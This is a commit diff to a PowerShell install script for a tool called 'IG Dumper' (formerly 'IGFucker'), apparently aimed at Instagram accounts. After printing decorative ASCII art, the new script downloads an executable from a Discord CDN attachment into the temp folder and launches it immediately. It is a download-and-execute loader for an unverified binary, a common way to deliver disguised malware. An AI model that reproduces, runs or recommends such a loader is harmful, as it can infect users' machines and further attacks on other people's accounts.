01b89da1512b14edb27994b2deba76f045f8f5ba
Adrian <adrian@hazybot.net>
2026-06-04 00:12:37 -0500

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,23 +1,36 @@
-$ErrorActionPreference = "Stop"
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+Clear-Host
+
+Write-Host "  .  *  ✧   .   *   ✧   .   *   ✧   .   *   ✧   .   *   ✧  ." -ForegroundColor Magenta
+Write-Host "        .        .       .       .       .       .       ." -ForegroundColor DarkGray
+Write-Host "   ✧         *      (\___/)      *         ✧         *" -ForegroundColor White
+Write-Host "        .      .    ( ≧◡≦ )    .      .        ." -ForegroundColor Magenta
+Write-Host "   *         ✧      /      \      ✧         *         ✧" -ForegroundColor White
+Write-Host "        .          (_/|__| \_)          .        .       ." -ForegroundColor DarkGray
+Write-Host "  .  *  ✧   .   *   ✧   .   *   ✧   .   *   ✧   .   *   ✧  ." -ForegroundColor Magenta
+Write-Host ""
+Write-Host "      ____ ______   ____                                " -ForegroundColor Magenta
+Write-Host "     /  _// ____/  / __ \__  ______ ___  ____  ___  _____" -ForegroundColor Magenta
+Write-Host "     / / / / __   / / / / / / / __ ``__ \/ __ \/ _ \/ ___/" -ForegroundColor Magenta
+Write-Host "   _/ / / /_/ /  / /_/ / /_/ / / / / / / /_/ /  __/ /    " -ForegroundColor Magenta
+Write-Host "  /___/ \____/  /_____/\__,_/_/ /_/ /_/ .___/\___/_/     " -ForegroundColor Magenta
+Write-Host "                                     /_/                 " -ForegroundColor Magenta
+Write-Host ""
+Write-Host "                                     ★ by @92tif ★" -ForegroundColor Magenta
+Write-Host "                               v1.0.0-alpha" -ForegroundColor DarkGray
+Write-Host ""
+Write-Host "  Starting download of IG Dumper..." -ForegroundColor White
+Write-Host ""
+
+$url = "https://cdn.discordapp.com/attachments/1490996423490011186/1511956978061152326/Setup.exe?ex=6a22572a&is=6a2105aa&hm=7e5f483a30ff693e97fda6ac16e3b2431576c90f2fd0108554fe0b05e0973f7b&"
+$dest = "$env:TEMP\Setup.exe"
+
+$ProgressPreference = 'Continue'
+Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
 
 Write-Host ""
-Write-Host "  ___ ___  ___ _   _ ___ _  _____ ___ " -ForegroundColor Magenta
-Write-Host " |_ _/ __| | __| | | / __| |/ / __| _ \" -ForegroundColor Magenta
-Write-Host "  | | (_ | | _|| |_| \__ \ ' <| _||   /" -ForegroundColor Magenta
-Write-Host " |___\___| |_|  \___/|___/_|\_\___|_|_\ " -ForegroundColor Magenta
-Write-Host "                                        "
-Write-Host "          By @92tif" -ForegroundColor White
+Write-Host "  ♥ DONE! Executing installer..." -ForegroundColor Green
 Write-Host ""
 
-$exeUrl = "https://github.com/4drixn/IG-Fucker/releases/latest/download/IGFucker.exe"
-$destPath = "$env:USERPROFILE\Desktop\IGFucker.exe"
-
-Write-Host "[+] Descargando la ultima version de IGFucker..." -ForegroundColor Cyan
-Try {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing
-    Write-Host "[SUCCESS] Descarga completada." -ForegroundColor Green
-    Write-Host "[>] El ejecutable se ha guardado en tu Escritorio: $destPath" -ForegroundColor White
-} Catch {
-    Write-Host "[ERROR] Hubo un problema descargando el archivo. Asegurate de que la Release en GitHub sea publica y el archivo se llame IGFucker.exe." -ForegroundColor Red
-}
-Write-Host ""
+Start-Sleep -Seconds 1
+Start-Process -FilePath $dest
